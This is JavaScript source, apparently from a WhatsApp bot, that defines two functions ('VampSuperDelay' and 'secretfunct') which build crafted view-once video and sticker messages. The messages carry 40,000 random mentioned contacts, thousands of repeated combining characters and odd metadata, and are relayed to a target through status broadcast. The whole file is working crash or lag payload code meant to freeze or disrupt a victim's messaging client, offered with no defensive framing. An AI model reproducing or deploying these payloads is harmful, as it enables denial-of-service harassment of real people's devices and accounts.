async function VampSuperDelay(sock, jid, mention = true) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "Vampire Crash" + "ោ៝".repeat(10000),
    title: "Iqbhalkeifer",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.youtube.com/@iqbhalkeifer25",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "V A M P I R E  H E R E ! ! !",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "VampClouds",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function secretfunct(sock, jid, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" +
                  Math.floor(Math.random() * 500000000) +
                  "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
